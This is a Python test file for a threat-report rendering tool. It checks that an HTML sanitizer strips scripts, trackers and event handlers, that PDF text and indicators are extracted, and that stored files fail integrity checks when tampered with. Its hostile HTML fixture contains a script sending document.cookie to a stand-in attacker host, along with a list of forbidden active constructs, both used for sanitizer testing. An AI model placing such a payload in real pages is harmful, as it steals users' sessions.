"""Safe rendering, PDF extraction, and stored-source contracts (#13, #14)."""

from __future__ import annotations

import hashlib
import re

import pytest

from tests.pdf_fixture import text_pdf
from pivotglass.core.document_entity_extraction import extract_entity_candidates
from pivotglass.core.document_ingestion import preview_document
from pivotglass.core.document_library import DocumentLibraryService
from pivotglass.core.document_rendering import render_document, sanitize_html
from pivotglass.core.workspace import WorkspaceManager

HOSTILE = """<html><head><title>APT report</title><base href="http://evil.example/">
<meta http-equiv="refresh" content="0;url=http://evil.example/">
<link rel="stylesheet" href="http://evil.example/x.css">
<style>body{background:url(http://evil.example/track.png)}</style>
<script>fetch('http://evil.example/'+document.cookie)</script></head>
<body onload="alert(1)"><h1 style="background:url(http://evil.example/a)">Infra</h1>
<p>C2 at <b>203.0.113.7</b>, staging on <a href="javascript:alert(1)" onclick="x()">evil-cdn.example.net</a>.</p>
<img src="http://evil.example/pixel.gif" alt="beacon 198.51.100.9">
<iframe src="http://evil.example/"></iframe><form action="http://evil.example/"><input name=q></form>
<table><tr><td colspan="2" onmouseover="x()">hxxp://bad[.]example.org/drop</td></tr></table>
<noscript>noscript-only.example.com</noscript></body></html>"""


def _visible_text(rendered: str) -> str:
    return re.sub(r"<[^>]+>", "", rendered)


def test_sanitizer_removes_every_active_or_fetching_construct() -> None:
    rendered, notes = sanitize_html(HOSTILE)
    lowered = rendered.casefold()
    for forbidden in ("<script", "<style", "<iframe", "<form", "<input", "<img", "<base",
                      "<meta", "<link", "onload", "onclick", "onmouseover", "style=",
                      "src=", "href=", "url(", "fetch("):
        assert forbidden not in lowered, forbidden
    assert 'colspan="2"' in rendered
    # Links become inert text; the target is visible only as an escaped tooltip.
    assert 'class="pg-link" title="javascript:alert(1)"' in rendered
    assert any("inert" in note for note in notes)
    assert any("placeholder" in note for note in notes)


def test_media_labels_never_enter_searchable_text() -> None:
    rendered, _ = sanitize_html(HOSTILE)
    assert "198.51.100.9" not in _visible_text(rendered)
    assert 'data-label="beacon 198.51.100.9"' in rendered


def test_html_rendering_preserves_indicator_occurrences_for_ordinal_anchoring() -> None:
    data = HOSTILE.encode()
    preview = preview_document(data, filename="report.html")
    rendering = render_document(data, media_type=preview.detected_media_type,
                                output_text=preview.output_text)
    assert rendering.kind == "html" and rendering.anchoring == "ordinal"
    text = _visible_text(rendering.html or "")
    for value in ("203.0.113.7", "evil-cdn.example.net", "hxxp://bad[.]example.org/drop"):
        assert text.count(value) == preview.output_text.count(value) == 1
    assert "noscript-only.example.com" not in text
    assert "noscript-only.example.com" not in preview.output_text


def test_markdown_renders_layout_but_never_raw_html() -> None:
    source = "# Report\n\n| ip | role |\n|---|---|\n| 203.0.113.7 | c2 |\n\n<script>x()</script>\n"
    rendering = render_document(source.encode(), media_type="text/markdown", output_text=source)
    assert rendering.kind == "html"
    assert "<h1>Report</h1>" in (rendering.html or "")
    assert "<table>" in (rendering.html or "")
    assert "<script" not in (rendering.html or "")
    assert "&lt;script&gt;" in (rendering.html or "")


def test_plain_formats_use_exact_offsets_into_parser_text() -> None:
    for media_type in ("text/plain", "text/csv", "application/json", "message/rfc822"):
        rendering = render_document(b"x", media_type=media_type, output_text="x")
        assert (rendering.kind, rendering.anchoring, rendering.html) == ("text", "exact", None)


def test_pdf_text_is_extracted_per_page_and_yields_candidates() -> None:
    data = text_pdf([["C2 at 203.0.113.7 and evil-cdn.example.net"],
                     ["Second page hxxp://bad[.]example.org/x"]])
    preview = preview_document(data, filename="report.pdf")
    assert preview.state == "parsed"
    assert preview.output_text.startswith("[page 1]\n")
    assert "[page 2]" in preview.output_text
    found = extract_entity_candidates(
        preview.output_text, occurrence_id="t", parser_receipt_id="t",
        input_sha256=preview.output_sha256,
    )
    values = {item.normalized_value for item in found.candidates}
    assert {"203.0.113.7", "evil-cdn.example.net"} <= values
    for item in found.candidates:
        assert preview.output_text[item.start_char:item.end_char] == item.raw_value
    assert render_document(data, media_type="application/pdf",
                           output_text=preview.output_text).kind == "pdf"


def test_textless_pdf_pages_are_reported_not_guessed() -> None:
    preview = preview_document(text_pdf([["203.0.113.7"], []]), filename="scan.pdf")
    assert preview.state == "partial"
    assert any("no text layer" in item and ": 2." in item for item in preview.skipped)


def _library(tmp_path) -> tuple[WorkspaceManager, DocumentLibraryService]:
    manager = WorkspaceManager(tmp_path)
    manager.create("render")
    manager.switch("render")
    return manager, DocumentLibraryService(manager)


def test_stored_detail_carries_rendering_and_verified_source_bytes(tmp_path) -> None:
    manager, service = _library(tmp_path)
    data = text_pdf([["C2 at 203.0.113.7"]])
    service.ingest_bytes(data, filename="r.pdf", operator="analyst",
                         expected_sha256=hashlib.sha256(data).hexdigest())
    occurrence = service.list()[0].occurrence_id
    detail = service.detail(occurrence)
    assert detail["rendering"]["kind"] == "pdf"
    assert service.source_bytes(occurrence) == data

    digest = hashlib.sha256(data).hexdigest()
    path = manager._content_store_path("render") / "sha256" / digest[:2] / digest  # noqa: SLF001
    path.chmod(0o600)
    path.write_bytes(data + b"tampered")
    with pytest.raises(RuntimeError, match="integrity"):
        service.source_bytes(occurrence)
